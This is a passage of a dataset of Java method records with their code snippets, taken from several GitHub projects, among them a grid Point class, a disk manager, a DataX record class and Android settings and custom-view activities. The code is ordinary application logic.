offset));                break;            case Direction.NORTH_WEST:                clone.setX((clone.getX() - offset));                clone.setY((clone.getY() - offset));                break;        }        return clone;    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/room/src/main/java/com/nitro/room/utils/Point.java", "stars": "2", "class": {"name": "Point", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDistanceAround", "params": ["Point"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getDistanceAround(Point point) {        Point clone = this.clone();        if(point != null) {            clone.setX((clone.getX() - point.getX()));            clone.setY((clone.getY() - point.getY()));        }        return ((clone.getX() * clone.getX()) + (clone.getY() * clone.getY()));    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/room/src/main/java/com/nitro/room/utils/Point.java", "stars": "2", "class": {"name": "Point", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "comparePoint", "params": ["Point"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean comparePoint(Point point) {        if(point != null) {            if((this.x == point.getX()) && (this.y == point.getY())) return true;        }        return false;    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/room/src/main/java/com/nitro/room/utils/Point.java", "stars": "2", "class": {"name": "Point", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getX", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getX() {        return this.x;    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/room/src/main/java/com/nitro/room/utils/Point.java", "stars": "2", "class": {"name": "Point", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setX", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setX(int x) {        this.x = x;    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/room/src/main/java/com/nitro/room/utils/Point.java", "stars": "2", "class": {"name": "Point", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getY", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getY() {        return this.y;    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/room/src/main/java/com/nitro/room/utils/Point.java", "stars": "2", "class": {"name": "Point", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setY", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setY(int y) {        this.y = y;    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/room/src/main/java/com/nitro/room/utils/Point.java", "stars": "2", "class": {"name": "Point", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getZ", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getZ() {        return this.z;    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/room/src/main/java/com/nitro/room/utils/Point.java", "stars": "2", "class": {"name": "Point", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setZ", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setZ(int z) {        this.z = z;    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/room/src/main/java/com/nitro/room/utils/Point.java", "stars": "2", "class": {"name": "Point", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "asT", "params": ["Object", "Class<T>"], "throws": null, "modifiers": ["static", "protected"], "return_type": "T", "snippet": "  protected static <T extends Serializable> T asT(final Object service, final Class<T> type) {    return type.cast(service);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/scheduler/AbstractQuartzJob.java", "stars": "18", "class": {"name": "AbstractQuartzJob", "extends": null, "implements": ["Job"], "modifiers": ["public", "abstract"]}}, {"method_name": "execute", "params": ["JobExecutionContext"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "  public abstract void execute(JobExecutionContext context);  protected Object getKey(final JobExecutionContext context, final String key) {    return context.getMergedJobDataMap().get(key);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/scheduler/AbstractQuartzJob.java", "stars": "18", "class": {"name": "AbstractQuartzJob", "extends": null, "implements": ["Job"], "modifiers": ["public", "abstract"]}}, {"method_name": "getKey", "params": ["JobExecutionContext", "String"], "throws": null, "modifiers": ["protected"], "return_type": "Object", "snippet": "  protected Object getKey(final JobExecutionContext context, final String key) {    return context.getMergedJobDataMap().get(key);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/scheduler/AbstractQuartzJob.java", "stars": "18", "class": {"name": "AbstractQuartzJob", "extends": null, "implements": ["Job"], "modifiers": ["public", "abstract"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\t\t\t}", "url": "https://raw.githubusercontent.com/hasaki-w-c/JAVA--/master/ray/Duotai.java", "stars": "2", "class": {"name": "Duotai", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setToken", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setToken(String token) {        this.token = token;    }", "url": "https://raw.githubusercontent.com/harvestcore/ipmdroid/master/app/src/main/java/com/agm/ipmanager/credentials/Credentials.java", "stars": "1", "class": {"name": "Credentials", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "finalize", "params": [], "throws": ["Throwable"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void finalize() throws Throwable {        logReader.close();        logWriter.close();        dbFile.close();        super.finalize();    }", "url": "https://raw.githubusercontent.com/CNYuYang/BusTub/master/src/main/java/run/yuyang/db/storage/disk/DiskManager.java", "stars": "2", "class": {"name": "DiskManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "writePage", "params": ["int", "byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void writePage(int pageId, byte[] data) {        try {            dbFile.seek(pageId * PAGE_SIZE);            dbFile.write(data);            numWrites++;        } catch (IOException e) {            e.printStackTrace();        }    }", "url": "https://raw.githubusercontent.com/CNYuYang/BusTub/master/src/main/java/run/yuyang/db/storage/disk/DiskManager.java", "stars": "2", "class": {"name": "DiskManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "readPage", "params": ["int", "byte"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void readPage(int pageId, byte[] data) {        int offset = pageId * PAGE_SIZE;        if (offset >= getFileSize(fileName)) {            log.debug(\"I/O error while reading\");        } else {            try {                dbFile.seek(offset);                dbFile.readFully(data);            } catch (IOException e) {                e.printStackTrace();            }        }    }", "url": "https://raw.githubusercontent.com/CNYuYang/BusTub/master/src/main/java/run/yuyang/db/storage/disk/DiskManager.java", "stars": "2", "class": {"name": "DiskManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "writeLog", "params": ["byte", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void writeLog(byte[] logData, int size) {        if (size == 0) {            return;        }        flushLogFlag = true;        numFlushes++;        try {            logWriter.write(logData, 0, size);            logWriter.flush();        } catch (IOException e) {            e.printStackTrace();        }        flushLogFlag = false;    }", "url": "https://raw.githubusercontent.com/CNYuYang/BusTub/master/src/main/java/run/yuyang/db/storage/disk/DiskManager.java", "stars": "2", "class": {"name": "DiskManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "readLog", "params": ["byte", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean readLog(byte[] logData, int size, int offset) {        if (offset >= getFileSize(logName)) {            return false;        }        try {            logReader.skip(offset);            logReader.read(logData, 0, size);        } catch (IOException e) {            e.printStackTrace();        }        return true;    }", "url": "https://raw.githubusercontent.com/CNYuYang/BusTub/master/src/main/java/run/yuyang/db/storage/disk/DiskManager.java", "stars": "2", "class": {"name": "DiskManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "allocatePage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int allocatePage() {        return nextPageId++;    }", "url": "https://raw.githubusercontent.com/CNYuYang/BusTub/master/src/main/java/run/yuyang/db/storage/disk/DiskManager.java", "stars": "2", "class": {"name": "DiskManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getNumFlushes", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getNumFlushes() {        return numFlushes;    }", "url": "https://raw.githubusercontent.com/CNYuYang/BusTub/master/src/main/java/run/yuyang/db/storage/disk/DiskManager.java", "stars": "2", "class": {"name": "DiskManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getNumWrites", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getNumWrites() {        return numWrites;    }", "url": "https://raw.githubusercontent.com/CNYuYang/BusTub/master/src/main/java/run/yuyang/db/storage/disk/DiskManager.java", "stars": "2", "class": {"name": "DiskManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getFlushState", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean getFlushState(){        return flushLogFlag;    }", "url": "https://raw.githubusercontent.com/CNYuYang/BusTub/master/src/main/java/run/yuyang/db/storage/disk/DiskManager.java", "stars": "2", "class": {"name": "DiskManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getFileSize", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "long", "snippet": "    private long getFileSize(String fileName) {        File file = new File(fileName);        return file.length();    }", "url": "https://raw.githubusercontent.com/CNYuYang/BusTub/master/src/main/java/run/yuyang/db/storage/disk/DiskManager.java", "stars": "2", "class": {"name": "DiskManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "deallocatePage", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void deallocatePage(int pageId) {    }", "url": "https://raw.githubusercontent.com/CNYuYang/BusTub/master/src/main/java/run/yuyang/db/storage/disk/DiskManager.java", "stars": "2", "class": {"name": "DiskManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "addColumn", "params": ["Column"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addColumn(Column column) {        columns.add(column);        incrByteSize(column);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/record/DefaultRecord.java", "stars": "23", "class": {"name": "DefaultRecord", "extends": null, "implements": ["Record"], "modifiers": ["public"]}}, {"method_name": "getColumn", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Column", "snippet": "    public Column getColumn(int i) {        if (i < 0 || i >= columns.size()) {            return null;        }        return columns.get(i);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/record/DefaultRecord.java", "stars": "23", "class": {"name": "DefaultRecord", "extends": null, "implements": ["Record"], "modifiers": ["public"]}}, {"method_name": "setColumn", "params": ["int", "Column"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setColumn(int i, final Column column) {        if (i < 0) {            throw DataXException.asDataXException(FrameworkErrorCode.ARGUMENT_ERROR,                    \"\u4e0d\u80fd\u7ed9index\u5c0f\u4e8e0\u7684column\u8bbe\u7f6e\u503c\");        }        if (i >= columns.size()) {            expandCapacity(i + 1);        }        decrByteSize(getColumn(i));        this.columns.set(i, column);        incrByteSize(getColumn(i));    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/record/DefaultRecord.java", "stars": "23", "class": {"name": "DefaultRecord", "extends": null, "implements": ["Record"], "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {        Map<String, Object> json = new HashMap<String, Object>();        json.put(\"size\", this.getColumnNumber());        json.put(\"data\", this.columns);        return JSON.toJSONString(json);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/record/DefaultRecord.java", "stars": "23", "class": {"name": "DefaultRecord", "extends": null, "implements": ["Record"], "modifiers": ["public"]}}, {"method_name": "getColumnNumber", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getColumnNumber() {        return this.columns.size();    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/record/DefaultRecord.java", "stars": "23", "class": {"name": "DefaultRecord", "extends": null, "implements": ["Record"], "modifiers": ["public"]}}, {"method_name": "getColumns", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Column>", "snippet": "    public List<Column> getColumns() {        return columns;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/record/DefaultRecord.java", "stars": "23", "class": {"name": "DefaultRecord", "extends": null, "implements": ["Record"], "modifiers": ["public"]}}, {"method_name": "uid", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String uid() {        return uid;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/record/DefaultRecord.java", "stars": "23", "class": {"name": "DefaultRecord", "extends": null, "implements": ["Record"], "modifiers": ["public"]}}, {"method_name": "getByteSize", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getByteSize() {        return byteSize;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/record/DefaultRecord.java", "stars": "23", "class": {"name": "DefaultRecord", "extends": null, "implements": ["Record"], "modifiers": ["public"]}}, {"method_name": "getMemorySize", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getMemorySize() {        return memorySize;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/record/DefaultRecord.java", "stars": "23", "class": {"name": "DefaultRecord", "extends": null, "implements": ["Record"], "modifiers": ["public"]}}, {"method_name": "copyElement", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object copyElement() {        return this;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/record/DefaultRecord.java", "stars": "23", "class": {"name": "DefaultRecord", "extends": null, "implements": ["Record"], "modifiers": ["public"]}}, {"method_name": "decrByteSize", "params": ["Column"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void decrByteSize(final Column column) {        if (null == column) {            return;        }        byteSize -= column.getByteSize();        //\u5185\u5b58\u7684\u5360\u7528\u662fcolumn\u5bf9\u8c61\u7684\u5934 \u518d\u52a0\u5b9e\u9645\u5927\u5c0f + uid        memorySize = memorySize - ClassSize.ColumnHead - column.getByteSize() - uid.getBytes().length;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/record/DefaultRecord.java", "stars": "23", "class": {"name": "DefaultRecord", "extends": null, "implements": ["Record"], "modifiers": ["public"]}}, {"method_name": "incrByteSize", "params": ["Column"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void incrByteSize(final Column column) {        if (null == column) {            return;        }        byteSize += column.getByteSize();        //\u5185\u5b58\u7684\u5360\u7528\u662fcolumn\u5bf9\u8c61\u7684\u5934 \u518d\u52a0\u5b9e\u9645\u5927\u5c0f + uid        memorySize = memorySize + ClassSize.ColumnHead + column.getByteSize() + uid.getBytes().length;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/record/DefaultRecord.java", "stars": "23", "class": {"name": "DefaultRecord", "extends": null, "implements": ["Record"], "modifiers": ["public"]}}, {"method_name": "expandCapacity", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void expandCapacity(int totalSize) {        if (totalSize <= 0) {            return;        }        int needToExpand = totalSize - columns.size();        while (needToExpand-- > 0) {            this.columns.add(null);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/transport/record/DefaultRecord.java", "stars": "23", "class": {"name": "DefaultRecord", "extends": null, "implements": ["Record"], "modifiers": ["public"]}}, {"method_name": "getLayoutId", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "int", "snippet": "    protected int getLayoutId() {        return R.layout.activity_setting;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/SettingActivity.java", "stars": "1", "class": {"name": "SettingActivity", "extends": "MyActivity", "implements": ["SwitchButton"], "modifiers": ["public", "final"]}}, {"method_name": "initView", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initView() {        // \u8bbe\u7f6e\u5207\u6362\u6309\u94ae\u7684\u76d1\u542c        mAutoSwitchView.setOnCheckedChangeListener(this);        setOnClickListener(R.id.sb_setting_language, R.id.sb_setting_update, R.id.sb_setting_agreement, R.id.sb_setting_about,                R.id.sb_setting_cache, R.id.sb_setting_auto, R.id.sb_setting_exit);    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/SettingActivity.java", "stars": "1", "class": {"name": "SettingActivity", "extends": "MyActivity", "implements": ["SwitchButton"], "modifiers": ["public", "final"]}}, {"method_name": "initData", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initData() {        // \u83b7\u53d6\u5e94\u7528\u7f13\u5b58\u5927\u5c0f        mCleanCacheView.setRightText(CacheDataManager.getTotalCacheSize(this));    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/SettingActivity.java", "stars": "1", "class": {"name": "SettingActivity", "extends": "MyActivity", "implements": ["SwitchButton"], "modifiers": ["public", "final"]}}, {"method_name": "onClick", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onClick(View v) {        switch (v.getId()) {            case R.id.sb_setting_language:                // \u5e95\u90e8\u9009\u62e9\u6846                new MenuDialog.Builder(this)                        // \u8bbe\u7f6e\u70b9\u51fb\u6309\u94ae\u540e\u4e0d\u5173\u95ed\u5bf9\u8bdd\u6846                        //.setAutoDismiss(false)                        .setList(R.string.setting_language_simple, R.string.setting_language_complex)                        .setListener((MenuDialog.OnListener<String>) (dialog, position, string) -> BrowserActivity.start(getActivity(), \"https://github.com/getActivity/MultiLanguages\"))                        .setGravity(Gravity.BOTTOM)                        .setAnimStyle(AnimAction.BOTTOM)                        .show();                break;            case R.id.sb_setting_update:                // \u672c\u5730\u7684\u7248\u672c\u7801\u548c\u670d\u52a1\u5668\u7684\u8fdb\u884c\u6bd4\u8f83                if (20 > AppConfig.getVersionCode()) {                    new UpdateDialog.Builder(this)                            // \u7248\u672c\u540d                            .setVersionName(\"2.0\")                            // \u662f\u5426\u5f3a\u5236\u66f4\u65b0                            .setForceUpdate(false)                            // \u66f4\u65b0\u65e5\u5fd7                            .setUpdateLog(\"\u4fee\u590dBug\\n\u4f18\u5316\u7528\u6237\u4f53\u9a8c\")                            // \u4e0b\u8f7d url                            .setDownloadUrl(\"https://raw.githubusercontent.com/getActivity/AndroidProject/master/AndroidProject.apk\")                            .show();                } else {                    toast(R.string.update_no_update);                }                break;            case R.id.sb_setting_agreement:                BrowserActivity.start(this, \"https://github.com/getActivity/Donate\");                break;            case R.id.sb_setting_about:                startActivity(AboutActivity.class);                break;            case R.id.sb_setting_auto:                // \u81ea\u52a8\u767b\u5f55                mAutoSwitchView.setChecked(!mAutoSwitchView.isChecked());                break;            case R.id.sb_setting_cache:                // \u6e05\u9664\u5185\u5b58\u7f13\u5b58\uff08\u5fc5\u987b\u5728\u4e3b\u7ebf\u7a0b\uff09                GlideApp.get(getActivity()).clearMemory();                new Thread(() -> {                    // \u6e05\u9664\u672c\u5730\u7f13\u5b58\uff08\u5fc5\u987b\u5728\u5b50\u7ebf\u7a0b\uff09                    GlideApp.get(getActivity()).clearDiskCache();                }).start();                CacheDataManager.clearAllCache(this);                postDelayed(() -> {                    // \u91cd\u65b0\u83b7\u53d6\u5e94\u7528\u7f13\u5b58\u5927\u5c0f                    mCleanCacheView.setRightText(CacheDataManager.getTotalCacheSize(getActivity()));                }, 500);                break;            case R.id.sb_setting_exit:                if (true) {                    startActivity(LoginActivity.class);                    // \u8fdb\u884c\u5185\u5b58\u4f18\u5316\uff0c\u9500\u6bc1\u9664\u767b\u5f55\u9875\u4e4b\u5916\u7684\u6240\u6709\u754c\u9762                    ActivityStackManager.getInstance().finishAllActivities(LoginActivity.class);                    return;                }                // \u9000\u51fa\u767b\u5f55                EasyHttp.post(this)                        .api(new LogoutApi())                        .request(new HttpCallback<HttpData<Void>>(this) {                            @Override                            public void onSucceed(HttpData<Void> data) {                                startActivity(LoginActivity.class);                                // \u8fdb\u884c\u5185\u5b58\u4f18\u5316\uff0c\u9500\u6bc1\u9664\u767b\u5f55\u9875\u4e4b\u5916\u7684\u6240\u6709\u754c\u9762                                ActivityStackManager.getInstance().finishAllActivities(LoginActivity.class);                            }                        });                break;            default:                break;        }    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/SettingActivity.java", "stars": "1", "class": {"name": "SettingActivity", "extends": "MyActivity", "implements": ["SwitchButton"], "modifiers": ["public", "final"]}}, {"method_name": "onCheckedChanged", "params": ["SwitchButton", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCheckedChanged(SwitchButton button, boolean isChecked) {        toast(isChecked);    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/SettingActivity.java", "stars": "1", "class": {"name": "SettingActivity", "extends": "MyActivity", "implements": ["SwitchButton"], "modifiers": ["public", "final"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_lesson3);    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson3Activity.java", "stars": "2", "class": {"name": "Lesson3Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "drawTextView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void drawTextView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.DRAW_TEXT_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson3Activity.java", "stars": "2", "class": {"name": "Lesson3Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "staticLayoutView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void staticLayoutView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.STATIC_LAYOUT_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson3Activity.java", "stars": "2", "class": {"name": "Lesson3Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "setTextSizeView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTextSizeView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.SET_TEXT_SIZE_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson3Activity.java", "stars": "2", "class": {"name": "Lesson3Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "setTypeFaceView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTypeFaceView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.SET_TYPE_FACE_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson3Activity.java", "stars": "2", "class": {"name": "Lesson3Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "setFakeBoldTextView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFakeBoldTextView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.SET_FAKE_BOLD_TEXT_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson3Activity.java", "stars": "2", "class": {"name": "Lesson3Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "setStrikeThruTextView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStrikeThruTextView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.SET_STRIKE_THRU_TEXT_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson3Activity.java", "stars": "2", "class": {"name": "Lesson3Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "setUnderLineTextView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUnderLineTextView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.SET_UNDER_LINE_TEXT_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson3Activity.java", "stars": "2", "class": {"name": "Lesson3Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "setTextSkewXiew", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTextSkewXiew(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.SET_TEXT_SKEW_X_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson3Activity.java", "stars": "2", "class": {"name": "Lesson3Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "setTextScaleXView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTextScaleXView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.SET_TEXT_SCALE_X_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson3Activity.java", "stars": "2", "class": {"name": "Lesson3Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "setTextAlignView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTextAlignView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.SET_TEXT_ALIGN_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson3Activity.java", "stars": "2", "class": {"name": "Lesson3Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "getFontSpacingView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getFontSpacingView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.GET_FONT_SPACING_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson3Activity.java", "stars": "2", "class": {"name": "Lesson3Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "measureTextView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void measureTextView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.MEASURE_TEXT_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson3Activity.java", "stars": "2", "class": {"name": "Lesson3Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "getTextBoundsView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getTextBoundsView(View view) {        ContainerActivity.startActivity(this, LayoutIdUtil.LayoutType.GET_TEXT_BOUNDS_VIEW.name());    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/activity/Lesson3Activity.java", "stars": "2", "class": {"name": "Lesson3Activity", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "getFontMetricsView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getFontMetricsView(View view) {        